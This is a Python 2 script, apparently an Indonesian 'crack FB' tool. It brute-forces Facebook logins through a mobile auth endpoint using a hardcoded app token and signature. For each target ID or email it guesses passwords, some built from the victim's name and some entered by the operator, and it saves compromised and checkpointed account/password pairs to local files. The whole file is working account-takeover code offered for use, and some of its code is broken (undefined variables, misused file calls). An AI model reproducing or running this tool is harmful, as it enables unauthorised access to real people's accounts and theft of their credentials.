																													if 'access_token' in q:
																														print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																														print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14
																														print '\033[1;96m| \033[1;92mTL \033[1;96m|\033[1;93m '+b['birthday']
																														oks.append(user+pass14)
																													else:
																														if 'www.facebook.com' in q["error_msg"]:
																															print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																															print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14
																															print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																															cek = open("out/mbf_cp.txt", "a")
																															cek.write(user+"|"+pass14+"\n")
																															cek.close()
																															cp.append(user+pass14)
																														else:
																															pass15 = b['last_name'] + '12'
																															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																															q = json.load(data)
																															if 'access_token' in q:
																																print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass15
																																print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																oks.append(user+pass15)
																															else:
																																if 'www.facebook.com' in q["error_msg"]:
																																	print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																	print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass15
																																	print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																	cek = open("out/mbf_cp.txt", "a")
																																	cek.write(user+"|"+pass15+"\n")
																																	cek.close()
																																	cp.append(user+pass15)
																																else:
																																	pass16 = b['last_name']
																																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																																	q = json.load(data)
																																	if 'access_token' in q:
																																		print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																		print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16
																																		print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																		oks.append(user+pass16)
																																	else:
																																		if 'www.facebook.com' in q["error_msg"]:
																																			print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																			print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16
																																			print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																			cek = open("out/mbf_cp.txt", "a")
																																			cek.write(user+"|"+pass16+"\n")
																																			cek.close()
																																			cp.append(user+pass16)
																																		else:
																																			pass17 = b['fist_name'] + '2020'
																																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																																			q = json.load(data)
																																			if 'access_token' in q:
																																				print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																				print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass17
																																				print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																				oks.append(user+pass17)
																																			else:
																																				if 'www.facebook.com' in q["error_msg"]:
																																					print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																					print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass17
																																					print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																					cek = open("out/mbf_cp.txt", "a")
																																					cek.write(user+"|"+pass17+"\n")
																																					cek.close()
																																					cp.append(user+pass17)
																																				else:
																																					pass18
																																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																																					q = json.load(data)
																																					if 'access_token' in q:
																																						print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass18
																																						print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																						oks.append(user+pass18)
																																					else:
																																						if 'www.facebook.com' in q["error_msg"]:
																																							print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
																																							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass18
																																							print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
																																							cek = open("out/mbf_cp.txt", "a")
																																							cek.write(user+"|"+pass18+"\n")
																																							cek.close()
																																							cp.append(user+pass18)


		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[✓] \033[1;93mSelesai \033[1;97m....'
	print'\033[1;96m[✓] \033[1;34mTotal OK \033[1;34m: \033[1;93m'+str(len(oks))
	print'\033[1;96m[✓] \033[1;93mTotal CP \033[1;93m : \033[1;97m'+str(len(cp))
	print("\033[1;96m[✓] \033[1;34mcekpoint File tersimpan \033[1;91m: \033[1;31mout/mbf_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	mbf()


def crack_email():
    os.system('clear')
    print logo
    print "\033[1;96m    \033[1;93m◆\033[1;31m ⃟ ⃟ \033[1;34m░▒▓ \033[1;93mCRACK EMAIL FB \033[1;34m▓▒░\033[1;31m ⃟ ⃟ \033[1;93m◆     \033[1;96m"
    print
    print 42*"\033[1;96m="
    try:
        print ('\033[1;96m[+] \033[1;93mContoh : \033[1;31mupil \033[1;31mupil_ \033[1;31mupil.pilek \033[1;31mdll')
        c = raw_input('\033[1;96m[+] \x1b[1;93mNama Target : \033[1;31m ')
        print '\033[1;96m[+] \033[1;93mContoh : \033[1;34m@yahoo.com,\033[1;34m@gmail.com \033[1;34mdll'
        k = raw_input('\033[1;96m[+] \033[1;93mDomain Email :\033[1;97m ')
        print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil123'
        pass1 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
        pass2 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
        pass3 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
        pass4 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
        pass5 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
        pass6 = raw_input('\033[1;96m[6] \033[1;93mPassword : \033[1;31m ')
        pass7 = raw_input('\033[1;96m[7] \033[1;93mPassword : \033[1;31m ')
        idlist = '..txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

        print 42*"\033[1;96m="
        m = raw_input('\033[1;96m[+] \x1b[1;93mNama Target : \033[1;31m ')
        k = raw_input('\033[1;96m[+] \033[1;93mDomain Email :\033[1;97m ')
        print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil123'
        pass8 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
        pass9 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
        pass10 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
        pass11 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
        pass12 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
        pass13 = raw_input('\033[1;96m[6] \033[1;93mPassword : \033[1;31m ')
        pass14 = raw_input('\033[1;96m[7] \033[1;93mPassword : \033[1;31m ')
        idlist = '..txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] Ora Ono '
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\033[1;96m[+] \x1b[1;93mTotal Email \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\033[1;96m[+] \033[1;93mProses Sedang Berlangsung ' + o,
        sys.stdout.flush()
        time.sleep(1)
    print
    print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
    print 42*"\033[1;96m="
    print "\033[96m| 😎 | " + 5*" " + "\033[35mEMAIL" + 8*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 4*" " + "\033[96m"
    print 42*"\033[1;96m="


    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass1
                okb = open('save/email.txt', 'a')
                okb.write('[OK] ' + c + user + k + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass1
                cps = open('save/email.txt', 'a')
                cps.write('[CP] ' + c + user + k + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass2
                    okb = open('save/email.txt', 'a')
                    okb.write('[OK] ' + c + user + k + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass2
                    cps = open('save/email.txt', 'a')
                    cps.write('[CP] ' + c + user + k + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass3
                        okb = open('save/email.txt', 'a')
                        okb.write('[CP] ' + c + user + k + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass3
                        cps = open('save/email.txt', 'a')
                        cps.write('[CP] ' + c + user + k + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass4
                            okb = open('save/email.txt', 'a')
                            okb.write('[OK] ' + c + user + k + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass4
                            cps = open('save/email.txt', 'a')
                            cps.write('[CP] ' + c + user + k + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass5
                                okb = open('save/email.txt', 'a')
                                okb.write('[OK]' + c + user + k + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass5
                                cps.open('save/email.txt', 'a')
                                cps.write('[CP]' + c + user + k + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass6
                                    okb = open('save/email.txt', 'a')
                                    okb.write('[OK] ' + c + user + k + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass6
                                    cps = open('save/email.txt', 'a')
                                    cps.write('[CP] ' + c + user + k + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass7
                                        okb = open('save/email.txt', 'a')
                                        okb.write('[OK]' + c + user + k + ' | ' + pass7 + '\n')
                                        okb.close()
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user + k +   ' | '  +  pass7
                                        cps.open('save/email.txt', 'a')
                                        cps.write('[CP]' + c + user + k + ' | ' + pass7 + '\n')
                                        cps.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass8
                                            okb = open('save/userid.txt', 'a')
                                            okb.write('[CP] ' + m + user + k + ' | ' + pass8 + '\n')
                                            okb.close()
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass8
                                            cps = open('save/userid.txt', 'a')
                                            cps.write('[CP] ' + m + user + k + ' | ' + pass8 + '\n')
                                            cps.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass9
                                                okb = open('save/userid.txt', 'a')
                                                okb.write('[OK] ' + m + user + k + ' | ' + pass9 + '\n')
                                                okb.close()
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass9
                                                cps = open('save/userid.txt', 'a')
                                                cps.write('[CP] ' + m + user + k + ' | ' + pass9 + '\n')
                                                cps.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                w = json.load(data)
                                                if 'access_token' in w:
                                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k + ' | '  +  pass10
                                                    okb = open('save/userid.txt', 'a')
                                                    okb.write('[OK]' + m + user + k + ' | ' + pass10 + '\n')
                                                    okb.close()
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in w['error_msg']:
                                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k + ' | '  +  pass10
                                                    cps.open('save/userid.txt', 'a')
                                                    cps.write('[CP]' + m + user + k + ' | ' + pass10 + '\n')
                                                    cps.close()
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    w = json.load(data)
                                                    if 'access_token' in w:
                                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass11
                                                        okb = open('save/userid.txt', 'a')
                                                        okb.write('[CP] ' + m + user + k + ' | ' + pass11 + '\n')
                                                        okb.close()
                                                        oks.append(user + pass11)
                                                    elif 'www.facebook.com' in w['error_msg']:
                                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass11
                                                        cps = open('save/userid.txt', 'a')
                                                        cps.write('[CP] ' + m + user + k + ' | ' + pass11 + '\n')
                                                        cps.close()
                                                        cekpoint.append(user + pass11)
                                                    else:
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        w = json.load(data)
                                                        if 'access_token' in w:
                                                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass12
                                                            okb = open('save/userid.txt', 'a')
                                                            okb.write('[OK] ' + m + user + k + ' | ' + pass12 + '\n')
                                                            okb.close()
                                                            oks.append(user + pass12)
                                                        elif 'www.facebook.com' in w['error_msg']:
                                                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass12
                                                            cps = open('save/userid.txt', 'a')
                                                            cps.write('[CP] ' + m + user + k + ' | ' + pass12 + '\n')
                                                            cps.close()
                                                            cekpoint.append(user + pass12)
                                                        else:
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            w = json.load(data)
                                                            if 'access_token' in w:
                                                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass13
                                                                okb = open('save/userid.txt', 'a')
                                                                okb.write('[OK]' + m + user + k + ' | ' + pass13 + '\n')
                                                                okb.close()
                                                                oks.append(user + pass13)
                                                            elif 'www.facebook.com' in w['error_msg']:
                                                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k +  ' | '  +  pass13
                                                                cps.open('save/userid.txt', 'a')
                                                                cps.write('[CP]' + m + user + k + ' | ' + pass13 + '\n')
                                                                cps.close()
                                                                cekpoint.append(user + pass13)
                                                            else:
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + k + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                w = json.load(data)
                                                                if 'access_token' in w:
                                                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user + k + ' | '  +  pass14
                                                                    okb = open('save/userid.txt', 'a')
                                                                    okb.write('[OK]' + m + user + k + ' | ' + pass14 + '\n')
                                                                    okb.close()
                                                                    oks.append(user + pass14)
                                                                elif 'www.facebook.com' in w['error_msg']:
                                                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user + k + ' | '  +  pass14
                                                                    cps.open('save/userid.txt', 'a')
                                                                    cps.write('[CP]' + m + user + k + ' | ' + pass14 + '\n')
                                                                    cps.close()
                                                                    cekpoint.append(user + pass14)

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42*"\033[1;96m="
    print '\033[1;96m[✓] \x1b[1;93mCrack Selesai ....'
    print '\033[1;96m[✓] \x1b[1;93mTotal \x1b[1;34mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;34m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\033[1;96m[✓] \x1b[1;97mCP/OK tersimpan : save/email.txt'
    print 42*"\033[1;96m="
    raw_input('\x1b[1;97m[\x1b[1;92m Kembali \x1b[1;97m]')
    os.system('python2 upil.py')


if __name__ == '__main__':
	try:
		login()
	except (KeyError,IOError):
		menu()
